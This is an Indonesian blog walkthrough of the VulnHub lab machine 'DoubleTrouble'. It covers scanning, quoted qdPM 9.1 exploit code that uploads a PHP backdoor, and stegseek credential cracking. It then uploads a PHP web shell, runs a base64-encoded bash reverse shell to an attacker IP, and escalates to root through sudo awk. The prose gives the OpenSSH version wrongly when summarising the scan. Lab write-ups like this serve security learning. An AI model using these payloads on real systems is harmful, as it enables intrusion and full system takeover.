---
layout: post
title:  "VulnHub: DoubleTrouble"
date:   "2022-11-16"
categories: vulnhub
tags: [RCE, awk]
---

Mesin dengan kategori `easy` dari sebuah *open community* yaitu VulnHub dengan menjalankan nmap lalu melihat eksploitasi yang tercantum dan mencoba menjalankan script yang menarik dari hasil pencarian `searchsploit`. ditambah, mencari `credentials` dari image `jpg`. dan login menggunakan credentials tersebut, memasang revshell dan masuk ke sistem lalu menjalankan `sudo -l` untuk `abusing` ke root.

## nmap scanning
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4uqqKMblsYkzCZ7j1Mn8OX4iKqTf55w3nolFxM6IDIrQ7SV4JthEGqnYsiWFGY0OpwHLJ80/pnc/Ehlnub7RCGyL5gxGkGhZPKYag6RDv0cJNgIHf5oTkJOaFhRhZPDXztGlfafcVVw0Agxg3xweEVfU0GP24cb7jXq8Obu0j4bNsx7L0xbDCB1zxYwiqBRbkvRWpiQXNns/4HKlFzO19D8bCY/GXeX4IekE98kZgcG20x/zoBjMPXWXHUcYKoIVXQCDmBGAnlIdaC7IBJMNc1YbXVv7vhMRtaf/ffTtNDX0sYydBbqbubdZJsjWL0oHHK3Uwf+HlEhkO1jBZw3Aj
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDkds8dHvtrZmMxX2P71ej+q+QDe/MG8OGk7uYjWBT5K/TZR/QUkD9FboGbq1+SpCox5qqIVo8UQ+xvcEDDVKaU=
|   256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIoK0bHJ3ceMQ1mfATBnU9sChixXFA613cXEXeAyl2Y2
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: qdPM | Login
|_http-favicon: Unknown favicon MD5: B0BD48E57FD398C5DA8AE8F2CCC8D90D
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Seperti biasa, 
* **22/TCP** menunjukkan service `ssh` dengan versi `OpenSSH 8.9.1 Debian 10`
* **80/TCP** dengan service `http` dengan versi `Apache httpd 2.4.38` running on `Debian`.

Karena penasaran dengan `http-title` saya mencoba untuk mencarinya lewat `public vulnerability databases` terkenal. yaitu `searchsploit`.
## searchsploit checks
```
╭─ via [vh/doubletrouble]
╰─ searchsploit "qdPM"
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
qdPM 7 - Arbitrary File upload                                                                                                                                                               | php/webapps/19154.py
qdPM 7.0 - Arbitrary '.PHP' File Upload (Metasploit)                                                                                                                                         | php/webapps/21835.rb
qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting                                                                                                                               | php/webapps/48486.txt
qdPM 9.1 - 'filter_by' SQL Injection                                                                                                                                                         | php/webapps/45767.txt
qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                                                                                                                                           | php/webapps/46399.txt
qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                                                                                                                                           | php/webapps/46387.txt
qdPM 9.1 - 'type' Cross-Site Scripting                                                                                                                                                       | php/webapps/46398.txt
qdPM 9.1 - Arbitrary File Upload                                                                                                                                                             | php/webapps/48460.txt
qdPM 9.1 - Remote Code Execution                                                                                                                                                             | php/webapps/47954.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)                                                                                                                                       | php/webapps/50175.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)                                                                                                                                  | php/webapps/50944.py
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                                                                 | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                                                               | php/webapps/50176.txt
qdPM < 9.1 - Remote Code Execution                                                                                                                                                           | multiple/webapps/48146.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
## exploit analyzing
ada beberapa hal menarik yang ingin saya jelaskan di sini ialah dalam `php/webapps/47954.py` terdapat kode seperti yang ada di bawah
```py
def main(HOSTNAME, EMAIL, PASSWORD):
    url = HOSTNAME + '/index.php/login'
    result = session_requests.get(url)
    #print(result.text)
    login_tree = html.fromstring(result.text)
    authenticity_token = list(set(login_tree.xpath("//input[@name='login[_csrf_token]']/@value")))[0]
    payload = {'login[email]': EMAIL, 'login[password]': PASSWORD, 'login[_csrf_token]': authenticity_token}
    result = session_requests.post(HOSTNAME + '/index.php/login', data=payload, headers=dict(referer=HOSTNAME + '/index.php/login'))
    # The designated admin account does not have a myAccount page
    account_page = session_requests.get(HOSTNAME + 'index.php/myAccount')
    account_tree = html.fromstring(account_page.content)
    userid = account_tree.xpath("//input[@name='users[id]']/@value")
    username = account_tree.xpath("//input[@name='users[name]']/@value")
    csrftoken_ = account_tree.xpath("//input[@name='users[_csrf_token]']/@value")
    req(userid, username, csrftoken_, EMAIL, HOSTNAME)
    get_file = session_requests.get(HOSTNAME + 'index.php/myAccount')
    final_tree = html.fromstring(get_file.content)
    backdoor = requests.get(HOSTNAME + "uploads/users/")
    count = 0
    dateStamp = "1970-01-01 00:00"
    backdoorFile = ""
    for line in backdoor.text.split("\n"):
        count = count + 1
        if "backdoor.php" in str(line):
            try:
                start = "\"right\""
                end = " </td"
                line = str(line)
                dateStampNew = line[line.index(start)+8:line.index(end)]
                if (dateStampNew > dateStamp):
                    dateStamp = dateStampNew
                    print("The DateStamp is " + dateStamp)
                    backdoorFile = line[line.index("href")+6:line.index("php")+3]
            except:
                print("Exception occurred")
                continue
        #print(backdoor)
    print('Backdoor uploaded at - > ' + HOSTNAME + 'uploads/users/' + backdoorFile + '?cmd=whoami')
```
dalam variable `url` sudah dipastikan bahwa POST request akan dikirimkan ke `/index.php/login` dengan banyak `payload` untuk autentikasi seperti password dan username.

> berarti saya harus mendapatkan credentialsnya terlebih dahulu

lalu, kalau sudah mendapatkan `credentials` akan dilanjutkan untuk mengirim `session requests`. karena saya ingin mencoba manual untuk memahami konsep kode tersebut berjalan (bukan karena tidak tahu cara memakai automasi) dengan sempurna sampai ke titik variable `get_file` yang merujuk pada url `/index.php/myAccount` untuk melakukan injeksi seperti variable `backdoor` jelaskan. dalam fungsi `req` dengan beberapa parameternya yaitu `userid`, `username`, `csrftoken_`, `EMAIL` dan `HOSTNAME` ada hal menarik yang perlu dilihat.
```py
def req(userid, username, csrftoken_, EMAIL, HOSTNAME):
    request_1 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, '.htaccess')
    new = session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_1)
    request_2 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, '../.htaccess')
    new1 = session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_2)
    request_3 = {
        'sf_method': (None, 'put'),
        'users[id]': (None, userid[-1]),
        'users[photo_preview]': (None, ''),
        'users[_csrf_token]': (None, csrftoken_[-1]),
        'users[name]': (None, username[-1]),
        'users[new_password]': (None, ''),
        'users[email]': (None, EMAIL),
        'extra_fields[9]': (None, ''),
        'users[photo]': ('backdoor.php', '<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>', 'application/octet-stream'),
        }
    upload_req = session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_3)
```
dalam array `request_3` ada `users[photo]` yang akan mengirimkan request dengan format php yang berisikan `RCE` untuk disalahgunakan. dengan begitu bisa disimpulkan dalam variable `upload_req` akan mengirimkan arguments `files` yaitu `requests_3` ke `/index.php/myAccount/update` lalu RCE akan terbentuk.

Dengan begitu,

saya tahu apa yang harus saya lakukan dalam mesin ini. Let's get digging into the hacking phase!
## Directory Brute-force

```
╭─ via [vh/doubletrouble]
╰─ cat gobuster 
/uploads              (Status: 301) [Size: 316] [--> http://192.168.56.29/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.56.29/css/]
/template             (Status: 301) [Size: 317] [--> http://192.168.56.29/template/]
/images               (Status: 301) [Size: 315] [--> http://192.168.56.29/images/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.56.29/js/]
/sf                   (Status: 301) [Size: 311] [--> http://192.168.56.29/sf/]
/core                 (Status: 301) [Size: 313] [--> http://192.168.56.29/core/]
/install              (Status: 301) [Size: 316] [--> http://192.168.56.29/install/]
/secret               (Status: 301) [Size: 315] [--> http://192.168.56.29/secret/]
/backups              (Status: 301) [Size: 316] [--> http://192.168.56.29/backups/]
/batch                (Status: 301) [Size: 314] [--> http://192.168.56.29/batch/]
/server-status        (Status: 403) [Size: 278]
```
dalam directory `/install` ada hal menarik yang ingin saya jelaskan, di dalam directory tersebut ada `connection shock` yang bisa saya simpulkan kalau revshell ga perlu untuk susah payah haha.

![images](https://i.postimg.cc/WpXzxq9B/image.png)

```
╭─ via [vh/doubletrouble]
╰─ ncat -nvlp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.56.29.
Ncat: Connection from 192.168.56.29:47330.
```

## Whatweb results

```
╭─ via [vh/doubletrouble]
╰─ cat whatweb_scan 
http://192.168.56.29 [200 OK] Apache[2.4.38], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.56.29], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]
```
Ya, sepertinya semua di sini sudah ditampilkan oleh nmap.

## Nikto results

```
╭─ via [vh/doubletrouble]
╰─ nikto -host $victim | tee nikto_scan 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.29
+ Target Hostname:    192.168.56.29
+ Target Port:        80
+ Start Time:         2022-11-16 13:50:02 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie qdPM8 created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x1a 0x4b402c6422300 
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /install/: This might be interesting...
+ OSVDB-3092: /readme.txt: This might be interesting...
+ OSVDB-3268: /secret/: Directory indexing found.
```
seperti yang sudah ditampilkan oleh `gobuster`, di dalam directory `/secret` terdapat sebuah image berformat `jpg`.

![images2](https://i.postimg.cc/D0PXN7j7/image.png)

awalnya penasaran dan takut apakah nanti ada tingkat kesulitan lagi untuk menganalisis gambar ini? hadeh.

## image extraction

karena dalam directory `secret` ada semacam image berformat `jpg` maka saya mencoba untuk mendownloadnya dan mencari isi file tersebut.
```
╭─ via [vh/doubletrouble]
╰─ wget http://$victim/secret/doubletrouble.jpg                                           
--2022-11-17 11:23:55--  http://192.168.56.29/secret/doubletrouble.jpg
Connecting to 192.168.56.29:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 82779 (81K) [image/jpeg]
Saving to: ‘doubletrouble.jpg.1’

doubletrouble.jpg.1                                     100%[==============================================================================================================================>]  80.84K  --.-KB/s    in 0.004s  

2022-11-17 11:23:55 (17.8 MB/s) - ‘doubletrouble.jpg’ saved [82779/82779]
╭─ via [vh/doubletrouble]
╰─ file *jpg                                          
doubletrouble.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 501x450, components 3
╭─ via [vh/doubletrouble]
╰─ binwalk *jpg                    

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
╭─ via [vh/doubletrouble]
╰─ stegseek -xf -sf *jpg -wl ~/Desktop/rockyou.txt                                                       1 ↵
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "92camaro"         
[i] Original filename: "creds.txt".
[i] Extracting to "-sf".
```
Well, bahkan ada original filename.
```
╭─ via [vh/doubletrouble]
╰─ mv ./-sf creds.txt      
╭─ via [vh/doubletrouble]
╰─ cat creds.txt         
otisrush@localhost.com
otis666%
```

## shell as www-data
seperti yang sudah dijelaskan pada subbab `exploit analyzing` bahwasanya `qdPM 9.1` bisa dipasangi revshell pada `/index.php/myAccount` bagian list Photo karena ada `file attachment`. saya mencoba memasang RCE berformat `phtml`.
```
╭─ via [vh/doubletrouble]
╰─ cat *phtml   
<?php system($_GET['c']); ?>
```
ketika saya upload, dan saya pergi ke `/uploads/users/` untuk mencari backdoor yang saya pasang.
```
╭─ via [vh/doubletrouble]
╰─ curl -s 'http://192.168.56.29/uploads/users/970086-lmfao.phtml?c=id'                                                     
uid=33(www-data) gid=33(www-data) groups=33(www-data)
╭─ via [vh/doubletrouble]
╰─ echo "/bin/bash -i >& /dev/tcp/192.168.56.1/12345 0>&1" | base64                                                                                                                                              
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg==
╭─ via [vh/doubletrouble]
╰─ curl -s 'http://192.168.56.29/uploads/users/970086-lmfao.phtml?c=echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg==+|+base64+-d+|+bash'

--

╭─ via [vh/doubletrouble]
╰─ ncat -nvlp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 192.168.56.29.
Ncat: Connection from 192.168.56.29:59362.
bash: cannot set terminal process group (467): Inappropriate ioctl for device
bash: no job control in this shell
www-data@doubletrouble:/var/www/html/uploads/users$
```

## shell as root
```
www-data@doubletrouble:/var/www/html/uploads/users$ sudo /usr/bin/awk 'BEGIN{system("/bin/bash")}'
id
uid=0(root) gid=0(root) groups=0(root)
```
